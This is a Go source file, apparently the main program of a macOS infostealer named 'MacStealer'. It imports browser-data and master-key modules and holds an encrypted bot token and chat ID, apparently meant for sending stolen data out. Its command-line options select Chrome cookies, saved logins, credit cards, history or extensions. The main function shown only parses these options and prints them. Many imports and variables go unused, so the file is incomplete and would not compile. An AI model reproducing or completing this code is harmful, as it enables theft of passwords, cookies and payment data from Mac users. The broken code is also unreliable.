package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"flag"

	"github.com/ultra-supara/MacStealer/browsingdata"
	"github.com/ultra-supara/MacStealer/masterkey"
)

const (
	encryptedToken = "njhPJcqUY0siKT02jVbx90vdyZJJU5kxIwmc+aMMsJAW+YTcZE8OHOD49+dP9QId"
	encryptedChatID = "f5dmAdFw1aFdide57gAP27654NgvvotkicmV/7Ws4zY="
)

var (
	decryptedToken   string
	decryptedChatID  string
)

func main() {
	if runtime.GOARCH != "arm64" && runtime.GOARCH != "amd64" {
		log.Fatal("This tool only runs on macOS (Apple Silicon or Intel)")
	}

	kind := flag.String("kind", "", "cookie, logindata, creditcard, history, or extension")
	localState := flag.String("localstate", "", "(optional) Chrome Local State file path")
	sessionstorage := flag.String("sessionstorage", "", "(optional) Chrome Session Storage")
	targetPath := flag.String("targetpath", "", "(optional) File path")
	profile := flag.String("profile", "Default", "(optional) Chrome profile name")
	listProfilesFlag := flag.Bool("list-profiles", false, "List available profiles")

	flag.Parse()

	if *listProfilesFlag {
		usr, _ := user.Current()
		fmt.Println("Profiles for", usr.HomeDir)
		os.Exit(0)
	}

	if *kind == "" {
		flag.Usage()
		os.Exit(1)
	}

	fmt.Println("Kind:", *kind)
	fmt.Println("Profile:", *profile)
	fmt.Println("Architecture:", runtime.GOARCH)
	fmt.Println("Go version: go1.26.3")
}